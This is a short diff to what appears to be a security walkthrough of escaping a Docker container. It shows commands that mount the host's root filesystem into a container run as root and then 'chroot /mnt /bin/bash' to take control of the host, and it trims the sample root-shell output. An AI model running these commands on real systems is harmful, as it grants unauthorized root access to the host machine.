@@ -87,12 +87,7 @@ docker run -it -v /:/mnt --rm -u root --entrypoint /bin/sh privatebin/nginx-fpm-
   - `-u root`: force container to run as root user
   - `--entrypoint /bin/sh`: ignore the default image command (eg: start nginx) and immediately run the shell
   - `privatebin/nginx-fpm-alpine:2.0.2`: target image
-- Take Control the Host
+- Take control the host
 ```
 /var/www # chroot /mnt /bin/bash
-groups: cannot find name for group ID 11
-To run a command as administrator (user "root"), use "sudo <command>".
-See "man sudo_root" for details.
-
-root@d1619432adaa:/#
 ```
